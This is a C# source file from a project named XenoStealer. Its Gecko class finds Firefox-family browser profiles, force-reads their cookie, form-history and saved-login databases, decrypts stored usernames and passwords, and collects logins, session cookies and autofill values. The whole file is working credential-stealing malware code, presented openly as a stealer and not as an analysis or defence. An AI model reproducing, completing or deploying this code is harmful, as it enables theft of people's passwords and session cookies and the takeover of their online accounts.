using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using static XenoStealer.DataExtractionStructs;

namespace XenoStealer
{
    public static class Gecko
    {

        public static DataExtractionStructs.GeckoBrowser[] GetAllInfo(GeckoBrowserOptions options) 
        {
            List<DataExtractionStructs.GeckoBrowser> browsers = new List<DataExtractionStructs.GeckoBrowser>();

            bool ShouldGetLogins = (options & GeckoBrowserOptions.Logins) == GeckoBrowserOptions.Logins;
            bool ShouldGetCookies = (options & GeckoBrowserOptions.Cookies) == GeckoBrowserOptions.Cookies;
            bool ShouldGetAutofills = (options & GeckoBrowserOptions.Autofills) == GeckoBrowserOptions.Autofills;

            if (!ShouldGetLogins && !ShouldGetCookies && !ShouldGetAutofills) 
            {
                return new DataExtractionStructs.GeckoBrowser[0];
            }

            foreach (KeyValuePair<string, string> browserInfo in Configuration.GeckoBrowsers) 
            {
                List<DataExtractionStructs.GeckoProfile> profiles = new List<DataExtractionStructs.GeckoProfile>();

                GeckoDecryptor decryptor = null;

                bool GetBrowserLogins = ShouldGetLogins;

                string browserName = browserInfo.Key;
                string browserProfilesPath = browserInfo.Value;
                string browserLibraryPath = Configuration.GeckoLibraryPaths[browserName];
                if (!Directory.Exists(browserProfilesPath)) 
                {
                    continue;
                }
                if (GetBrowserLogins) 
                {
                    if (!Directory.Exists(browserProfilesPath))
                    {
                        GetBrowserLogins = false;
                    }
                    else 
                    {
                        decryptor = new GeckoDecryptor(browserLibraryPath);
                        GetBrowserLogins = decryptor.Operational;
                    }
                }

                foreach (string profilePath in Directory.GetDirectories(browserProfilesPath)) 
                {
                    string profileName = new DirectoryInfo(profilePath).Name;

                    GeckoLogin[] logins = null;
                    GeckoCookie[] cookies = null;
                    GeckoAutoFill[] autofills = null;

                    if (GetBrowserLogins) 
                    {
                        logins = GetLogins(profilePath, decryptor);
                    }
                    if (ShouldGetCookies) 
                    {
                        cookies = GetCookies(profilePath);
                    }
                    if (ShouldGetAutofills) 
                    { 
                        autofills = GetAutoFill(profilePath);
                    }

                    if (logins == null && cookies == null && autofills == null) 
                    {
                        continue;
                    }

                    profiles.Add(new GeckoProfile(logins, cookies, autofills, profileName));
                    //if ()
                }


                decryptor?.Dispose();

                browsers.Add(new GeckoBrowser(profiles.ToArray(), browserName));
            }

            return browsers.ToArray();
        }

        public static DataExtractionStructs.GeckoAutoFill[] GetAutoFill(string profilePath) 
        {
            List<DataExtractionStructs.GeckoAutoFill> autoFills = new List<DataExtractionStructs.GeckoAutoFill>();
            string db_location = Path.Combine(profilePath, "formhistory.sqlite");
            if (!File.Exists(db_location))
            {
                return null;
            }

            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }

            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }

            if (!parser.ReadTable("moz_formhistory"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                string name = parser.GetValue(i, "fieldname");
                string value = parser.GetValue(i, "value");
                if (name == null || value == null) continue;
                autoFills.Add(new DataExtractionStructs.GeckoAutoFill(name, value));
            }

            return autoFills.ToArray();

        }
        public static DataExtractionStructs.GeckoCookie[] GetCookies(string profilePath)
        {
            List<DataExtractionStructs.GeckoCookie> cookies = new List<DataExtractionStructs.GeckoCookie>();

            string db_location = Path.Combine(profilePath, "cookies.sqlite");
            if (!File.Exists(db_location)) 
            {
                return null;
            }

            byte[] fileBytes=Utils.ForceReadFile(db_location);
            if (fileBytes == null) 
            {
                return null;
            }

            SqlLite3Parser parser;
            try 
            {
                parser = new SqlLite3Parser(fileBytes);
            } 
            catch 
            {
                return null;
            }

            if (!parser.ReadTable("moz_cookies"))
            {
                return null;
            }

            for (int i = 0; i < parser.GetRowCount(); i++) 
            {
                try
                {
                    string host = parser.GetValue(i, "host");
                    string name = parser.GetValue(i, "name");
                    string value = parser.GetValue(i, "value");
                    string path = parser.GetValue(i, "path");

                    if (!ulong.TryParse(parser.GetValue(i, "expiry"), out ulong expiry))
                    {
                        continue;
                    }
                    bool secure = parser.GetValue(i, "isSecure") != "0";
                    bool httpOnly = parser.GetValue(i, "isHttpOnly") != "0";
                    cookies.Add(new DataExtractionStructs.GeckoCookie(host, path, name, value, expiry, secure, httpOnly));
                }
                catch 
                {
                    continue;
                }

            }

            return cookies.ToArray();

        }
        public static DataExtractionStructs.GeckoLogin[] GetLogins(string profilePath, GeckoDecryptor decryptor) 
        {
            List<DataExtractionStructs.GeckoLogin> logins = new List<DataExtractionStructs.GeckoLogin>();


            if (!decryptor.SetProfilePath(profilePath)) 
            {
                return null;
                //fail.
            }

            string SQLpath = Path.Combine(profilePath, "signons.sqlite");
            string JSONpath = Path.Combine(profilePath, "logins.json");
            if (File.Exists(SQLpath) && new FileInfo(SQLpath).Length > 100)
            {
                byte[] sqlFileBytes = Utils.ForceReadFile(SQLpath);

                if (sqlFileBytes == null) 
                {
                    return null;
                    //fail.
                }


                SqlLite3Parser parser;

                try 
                {
                    parser=new SqlLite3Parser(sqlFileBytes);
                } 
                catch 
                {
                    return null;
                    //fail.
                }

                if (!parser.ReadTable("moz_logins")) 
                { 
                    return null;
                    //fail.
                }

                for (int i = 0; i < parser.GetRowCount(); i++)
                {
                    try
                    {
                        string hostname = parser.GetValue(i, "hostname");
                        string encryptedUsername = parser.GetValue(i, "encryptedUsername");
                        string encryptedPassword = parser.GetValue(i, "encryptedPassword");
                        string username = decryptor.Decrypt(encryptedUsername);
                        string password = decryptor.Decrypt(encryptedPassword);
                        if (hostname == null || username == null || password == null) continue;
                        logins.Add(new DataExtractionStructs.GeckoLogin(username, password, hostname));
                        //add it to passwords and stuff.
                    }
                    catch 
                    {
                        continue;//even if it errors, allow it to finish looping, it could be a single.
                    }
                }


            }
            else if (File.Exists(JSONpath))
            {
                string jsonText =  Utils.ForceReadFileString(JSONpath);

                if (jsonText == null) 
                { 
                    return null;
                    //fail.
                }
                
                dynamic jsonObject;

                try 
                {
                    JavaScriptSerializer serializer = new JavaScriptSerializer();
                    jsonObject = serializer.Deserialize<dynamic>(jsonText);
                } 
                catch 
                { 
                    return null;
                    //fail.
                }

                if (jsonObject != null && jsonObject.ContainsKey("logins"))
                {
                    dynamic[] json_logins = jsonObject["logins"];
                    foreach (dynamic login in json_logins)
                    {
                        if (login != null && login.ContainsKey("hostname") && login.ContainsKey("encryptedUsername") && login.ContainsKey("encryptedPassword"))
                        {
                            try
                            {
                                string hostname = (string)login["hostname"];
                                string encryptedUsername = (string)login["encryptedUsername"];
                                string encryptedPassword = (string)login["encryptedPassword"];
                                string username = decryptor.Decrypt(encryptedUsername);
                                string password = decryptor.Decrypt(encryptedPassword);
                                if (hostname == null || username == null || password == null) continue;
                                logins.Add(new DataExtractionStructs.GeckoLogin(username, password, hostname));
                                //add it to passwords and stuff.
                            }
                            catch 
                            {
                                continue;//even if it errors, allow it to finish looping, it could be a single.
                            }
                            
                        }
                    }
                }
                else 
                {
                    return null;
                    //fail.
                }

            }
            else 
            {
                return null;
                //fail.
            }

            return logins.ToArray();
        }

    }
}
